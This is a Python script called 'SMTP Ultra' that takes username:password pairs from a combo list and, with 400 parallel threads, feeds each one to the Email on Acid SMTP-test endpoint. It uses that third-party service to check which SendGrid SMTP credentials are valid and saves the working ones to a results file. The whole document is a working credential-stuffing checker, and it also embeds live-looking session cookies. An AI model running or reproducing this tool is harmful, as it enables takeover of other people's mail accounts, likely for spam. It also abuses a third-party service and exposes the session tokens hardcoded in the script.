import requests
import threading
import concurrent.futures
import time

def crack(line):
	try:
		username= line[0]
		password= line[1]

		s=requests.Session()
		HEADERS={"Accept": "application/json, text/javascript, */*; q=0.01","X-Requested-With": "XMLHttpRequest","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","Origin": "https://app.emailonacid.com","Sec-Fetch-Site": "same-origin","Sec-Fetch-Mode": "cors","Cookie": "_gcl_au=1.1.1611738477.1597315270; _ga=GA1.2.283267982.1597315270; _fbp=fb.1.1597315270927.2113649919; hubspotutk=4f59fe910c020f343a7722ab8fd8dac6; intercom-id-itcrvc6n=deadaca8-aa19-4cf3-93d2-2bc4a4ff21e3; _ga=GA1.3.283267982.1597315270; resourcesHS=1; optimizelyEndUserId=oeu1597723339899r0.1540268608122215; optimizelyBuckets=%7B%7D; optimizelySegments=%7B%22229615720%22%3A%22referral%22%2C%22229664668%22%3A%22gc%22%2C%22230725752%22%3A%22false%22%7D; _hjid=50ce40f3-b916-4d5f-a296-7f36c8c06745; _gid=GA1.2.1370160567.1598185437; __hstc=211037642.4f59fe910c020f343a7722ab8fd8dac6.1597315272108.1598020110592.1598185437606.6; __hssrc=1; eoa_session=t0h5ml49i3j4tgk0gvsbh1d0u5vdfrph; _hjAbsoluteSessionInProgress=0; _gid=GA1.3.1370160567.1598185437; optimizelyPendingLogEvents=%5B%5D; _gat_UA-9609839-1=1; apt.sid=AP-HHKYROTV4LF9-2-1598185672135-32564375; apt.uid=AP-HHKYROTV4LF9-2-1598185672139-18966181.0.2.3052025f-7dbf-43ce-ad72-ae8fb0376472; _uetsid=0af0864b861291819941b3e2ab1d1a0d; _uetvid=9d5f365f7dc6745c8e1d727625477545; __hssc=211037642.8.1598185437606; intercom-session-itcrvc6n=Vm9QY0YvRDdMdVA0L3RubEdpbDlPNHUzOGNjcEl3UVc5SXpFMnhCU2s5NDMrSDVQbExZL3NJa2MxN2JpRW9NNS0tOE5KUkx1QldSYXlVbVhmZmhESUsvQT09--913e54b61b43d7748ff4283fbf5f88cc43eefbd5; AWSALB=RUQ2SveWbdeII8u1QQHqBBhvl5BAiY6eaMUevqf4Pl3V6xEvJGq/NTCYkcmiZZS/BBrFBLLi0TA3DQVvMPfRAYCXAkYCah/7udCdW9zHIISxeyc8Q5VEkb8M1P/f; AWSALBCORS=RUQ2SveWbdeII8u1QQHqBBhvl5BAiY6eaMUevqf4Pl3V6xEvJGq/NTCYkcmiZZS/BBrFBLLi0TA3DQVvMPfRAYCXAkYCah/7udCdW9zHIISxeyc8Q5VEkb8M1P/f","Sec-Fetch-Dest": "empty","Referer": "https://app.emailonacid.com/app/spamtest/","Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-US,en;q=0.9"}
		url="https://app.emailonacid.com/app/spamtest/testsmtp/settings"
		POSTDATA="""feedback_details=&guid=elemo0i1n5K9WYoHaUCXHlj6tQYRaCkPFrdR0JP26ZEDx&spam_guid=yu92r61o5v&spam_pref=smtp&smtp_host=smtp.sendgrid.net&smtp_acct="""+username+"""&smtp_secure=&smtp_port=587&smtp_pass="""+password+"""&smtp_from=&smtp_subject=&smtp_content-source=html&smtp_url=&smtp_html=&from_addr=&email_subject=&eoa_content-source=html&eoa_url=&eoa_html=&id=755339481231843&ev=SubscribedButtonClick&dl=https://app.emailonacid.com/app/spamtest/&rl=https://app.emailonacid.com/app/cp/welcome&if=false&ts=1596957553428&cd[buttonFeatures]=\{"classList":"btn+btn-default","destination":"https://app.emailonacid.com/app/spamtest/buildtest/","id":"test-smtp","imageUrl":"","innerText":"Test+SMTP","numChildButtons":0,"tag":"button","name":"","value":""\}&cd[buttonText]=Test+SMTP&cd[formFeatures]=[\{"id":"","name":"","tag":"button"\},\{"id":"guid","name":"guid","tag":"input","inputType":"hidden"\},\{"id":"guid","name":"spam_guid","tag":"input","inputType":"hidden"\},\{"id":"seed_list","name":"spam_pref","tag":"input","inputType":"radio"\},\{"id":"smtp_send","name":"spam_pref","tag":"input","inputType":"radio"\},\{"id":"smtp_host","name":"smtp_host","tag":"input","placeholder":"smtp.yourdomain.com","inputType":"text"\},\{"id":"smtp_username","name":"smtp_acct","tag":"input","placeholder":"Username","inputType":"text"\},\{"id":"smtp_secure","name":"smtp_secure","tag":"select","valueMeaning":"empty"\},\{"id":"smtp_port","name":"smtp_port","tag":"input","placeholder":"Port","inputType":"text"\},\{"id":"smtp_password","name":"smtp_pass","tag":"input","placeholder":"Password","inputType":"password"\},\{"id":"smtp_from","name":"smtp_from","tag":"input","placeholder":"test@yourdomain.com","inputType":"email","valueMeaning":"empty"\},\{"id":"smtp_subject","name":"smtp_subject","tag":"input","placeholder":"Email+Subject","inputType":"text","valueMeaning":"empty"\},\{"id":"smtp_url_content","name":"smtp_content-source","tag":"input","inputType":"radio"\},\{"id":"smtp_html_content","name":"smtp_content-source","tag":"input","inputType":"radio"\},\{"id":"url_source","name":"smtp_url","tag":"input","placeholder":"Enter+the+URL+to+your+email.","inputType":"url","valueMeaning":"empty"\},\{"id":"html_source","name":"smtp_html","tag":"textarea","placeholder":"Enter+your+email+HTML.","valueMeaning":"empty"\},\{"id":"","name":"","tag":"textarea","valueMeaning":"empty"\},\{"id":"eoa_send","name":"spam_pref","tag":"input","inputType":"radio"\},\{"id":"from_addr","name":"from_addr","tag":"input","placeholder":"example@test.com","inputType":"text","valueMeaning":"empty"\},\{"id":"email_subject","name":"email_subject","tag":"input","placeholder":"Email+Subject","inputType":"text","valueMeaning":"empty"\},\{"id":"eoa_url_content","name":"eoa_content-source","tag":"input","inputType":"radio"\},\{"id":"eoa_html_content","name":"eoa_content-source","tag":"input","inputType":"radio"\},\{"id":"url_source","name":"eoa_url","tag":"input","placeholder":"Enter+the+URL+to+your+email.","inputType":"url","valueMeaning":"empty"\},\{"id":"html_source","name":"eoa_html","tag":"textarea","placeholder":"Enter+your+email+HTML.","valueMeaning":"empty"\},\{"id":"","name":"","tag":"textarea","valueMeaning":"empty"\},\{"id":"save_settings","name":"save_settings","tag":"input","inputType":"checkbox"\},\{"id":"run_spam_test","name":"","tag":"button"\}]&cd[pageFeatures]=\{"title":"Email+On+Acid+-+Email+Testing"\}&cd[parameters]=[]&sw=1536&sh=864&v=2.9.23&r=stable&ec=2&o=30&fbp=fb.1.1596957485669.974275416&it=1596957530845&coo=false&es=automatic&tm=3&rqm=formPOST"""


		rq=s.post(url,headers=HEADERS, data=POSTDATA)
		if "Authentication: Successful" in rq.text:
			with open("rzlt.txt", "a") as rzlt:
				rzlt.write(username+":"+password+"\n")
			print('\033[92m'+"[✓]"+username+"|"+password)

			return line
		else:
			print('\033[91m'+"[x]"+username+"|"+password)
			return None
	except:
		pass
def go():
	print(">>Welcome to SMTP Ultra<<\n\n")
	with open("combo.txt", "r", encoding="utf-8") as combotxt:
		combo = combotxt.readlines()
	combo = [combo.rstrip().split(":") for combo in combo]

	with concurrent.futures.ThreadPoolExecutor(max_workers=400) as executor:
		results=list(executor.map(crack, combo))

	return results

if __name__ == '__main__':
	inittime= time.time()
	results=go()
	with open("rzlt.txt", "a") as rzlt:
		for result in results:
			if result != None:
				rzlt.write(result[0]+":"+result[1]+"\n")
	print("Finished in:"+str((time.time()-inittime)/60)+" minutes")
